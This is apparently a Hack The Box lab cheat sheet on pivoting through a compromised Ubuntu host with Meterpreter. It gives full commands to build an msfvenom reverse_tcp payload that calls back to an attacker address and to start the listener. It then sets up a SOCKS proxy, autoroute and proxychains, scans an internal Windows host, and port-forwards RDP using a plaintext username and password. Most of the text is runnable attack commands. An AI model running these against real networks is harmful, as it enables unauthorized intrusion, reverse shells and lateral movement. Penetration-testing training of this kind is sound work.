You already have a **Meterpreter shell on Ubuntu** (pivot), and now you want to:

- **Scan** or **attack internal targets** like `172.16.5.19` (Windows).
- Do this **through Ubuntu** without using SSH.
- Use **SOCKS proxy**, **proxychains**, and **port forwarding** with Meterpreter.

#### Step 1: Generate Linux Payload for Pivot (Ubuntu)
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 LPORT=8080 -f elf -o backupjob
```
- `LHOST`: your attack machine IP (HTB VPN)
- `LPORT`: where you'll listen for shell
- `-f elf`: format for Linux binary

#### Step 2: Start Metasploit Listener
```bash
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8080
run
```

#### Step 3: Transfer and Run Payload on Ubuntu
```bash
scp backupjob ubuntu@<ubuntu_ip>:~/
ssh ubuntu@<ubuntu_ip>
chmod +x backupjob
./backupjob
```
âœ… You now have a Meterpreter shell on Ubuntu.
___
### Use ping_sweep Post Module from Ubuntu
From Meterpreter:
```bash
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

This checks which IPs in that subnet (e.g., `172.16.5.19`) respond to ICMP (ping).
___
### Setup SOCKS Proxy on Metasploit (SOCKS4a)
```bash
use auxiliary/server/socks_proxy
set SRVHOST 0.0.0.0
set SRVPORT 9050
set VERSION 4a
run
```
Now you have a local SOCKS proxy at `127.0.0.1:9050`.
#### Add Route via AutoRoute
```bash
use post/multi/manage/autoroute
set SESSION 1  # your Ubuntu meterpreter session
set SUBNET 172.16.5.0
run
```

Confirm Route `meterpreter > run autoroute -p`


### Configure proxychains on Attacker
Edit `/etc/proxychains.conf` and make sure the last line says:
```
socks4 127.0.0.1 9050
```

- Use Proxychains with Nmap `proxychains nmap -p3389 -sT -v -Pn 172.16.5.19

___
### Optional: Meterpreter Local Port Forwarding (portfwd)
If you want to access RDP or a service directly:
```bash
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```
- `-l 3300`: Local port on attacker
- `-p 3389`: Port on Windows
- `-r 172.16.5.19`: Windows IP
Then
```bash
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```